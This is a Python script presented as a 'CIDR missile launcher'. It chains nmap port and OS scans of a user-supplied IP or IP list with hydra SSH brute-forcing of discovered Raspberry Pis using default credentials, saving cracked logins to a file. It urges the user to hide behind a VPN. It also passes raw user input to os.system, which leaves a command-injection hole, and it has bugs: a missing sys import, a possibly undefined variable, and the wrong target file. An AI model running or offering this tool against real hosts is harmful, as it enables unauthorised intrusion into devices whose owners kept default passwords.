import time
import os

os.system("clear")
print("""
  _____ _____ _____  _____    __  __ _____  _____ _____ _____ _      ______ 
  / ____|_   _|  __ \|  __ \  |  \/  |_   _|/ ____/ ____|_   _| |    |  ____|
 | |      | | | |  | | |__) | | \  / | | | | (___| (___   | | | |    | |__   
 | |      | | | |  | |  _  /  | |\/| | | |  \___ \\___ \  | | | |    |  __|  
 | |____ _| |_| |__| | | \ \  | |  | |_| |_ ____) |___) |_| |_| |____| |____ 
  \_____|_____|_____/|_|  \_\ |_|  |_|_____|_____/_____/|_____|______|______|
                                                                             
    __
   \ \_____
###[==_____>
   /_/      __
            \ \_____
         ###[==_____>
            /_/
 
""")
print("\033[1;31;40m ****Welcome to the CIDR missile launcher**** \033[0m")


def main():
    answer = input("You're about to launch a CIDR missile. Did you make sure your VPN is active? (yes/no)")
    if answer.lower() != "yes":
        print("Come back when you are protected, you noob.")
        sys.exit()

    port = input("What port are we looking for? ")
    scan_type = input("Are we scanning from a file (press 1) or a single IP (press 2)? ")
    if scan_type == "2":
        ip_address = input("What IP address are you scanning? ")
        command = f'sudo nmap -p {port} -oG - {ip_address} | awk \'/open/ {{print $2}}\' > port_{port}.txt'
    elif scan_type == "1":
        file_name = input("What is the file we are scanning? ")
        command = f'sudo nmap -p {port} -oG - -iL {file_name} | awk \'/open/ {{print $2}}\' > port_{port}.txt'
    os.system(command)

    print(f"Output saved to port_{port}.txt")
    os_scan = input("Would you like to run an OS scan of the results? (yes/no)")
    if os_scan.lower() == "yes":
        print("Checking for OS. This may take a few.", end = "")
        for i in range(5):
            print(".", end = "", flush = True)
            time.sleep(0.6)
        os_scan_command = f'sudo nmap -O -iL port_{port}.txt > OS_scan.txt'
        os.system(os_scan_command)
        print("\nOS scan results saved to OS_scan.txt")
        os.system(f"python osscan.py {port}")

        brute_force = input("Would you like me to run a brute force attack on the Pi's you found? (yes/no)")
    if brute_force.lower() == "yes":
        default_credentials = input("Would you like to use the default Pi credentials? (yes/no)")
        if default_credentials.lower() == "yes":
            os.system("hydra -L default_pi_username.txt -P default_pi_password.txt -M output.txt ssh -t 4 -s 22 -vV -o pi_logins.txt")
        else:
            username_file = input("Please provide the name of the username file: ")
            password_file = input("Please provide the name of the password file: ")
            os.system(f"hydra -L ./{username_file} -P ./{password_file} -M output.txt ssh -t 4 -s 22 -vV -o pi_logins.txt")
        print("Starting brute force attack...")
        # code to run brute force attack
    else:
        sys.exit()

if __name__ == "__main__":
    main()
